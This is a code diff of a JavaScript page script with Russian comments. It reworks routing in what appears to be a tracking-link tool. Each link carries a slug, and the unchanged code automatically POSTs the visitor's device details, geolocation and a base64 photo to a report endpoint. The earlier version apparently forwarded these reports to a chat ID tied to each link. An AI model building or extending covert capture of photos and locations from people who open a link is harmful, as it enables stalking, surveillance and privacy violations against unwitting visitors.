@@ -13,19 +13,14 @@ const UI = {
 window.__reportReady = false;
 let __slug = null;
 
-// === FETCH LINK INFO (привязка chatId) ===
+// === FETCH LINK INFO (привязка chatId не нужна, чисто проверка slug) ===
 async function loadLinkInfo() {
   const params = new URLSearchParams(location.search);
-  __slug = params.get('slug');
+  __slug = params.get('slug') || window.__SLUG || null;
   if (!__slug) return;
   try {
     const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(__slug)}`);
-    if (!r.ok) throw new Error(`HTTP ${r.status}`);
-    const data = await r.json();
-    if (data && data.chatId) {
-      window.__TARGET_CHAT_ID = data.chatId;
-      console.log('🔗 Привязка:', data);
-    }
+    if (r.ok) console.log('🔗 link-info ok');
   } catch (e) {
     console.warn('link-info fetch failed', e);
   }
@@ -141,9 +136,7 @@ function getDeviceInfo() {
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
   const body = { ...info, geo, photoBase64, note: 'auto' };
-  if (window.__TARGET_CHAT_ID) body.chatId = window.__TARGET_CHAT_ID;
-  if (__slug) body.slug = __slug;
-
+  if (__slug) body.slug = __slug; // маршрутизация по slug (мульти-адреса)
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -181,4 +174,4 @@ async function autoFlow() {
 
 // === Инициализация ===
 window.__autoFlow = autoFlow;
-loadLinkInfo(); // ← загружаем chatId для этой ссылки
+loadLinkInfo(); // ← загружаем slug
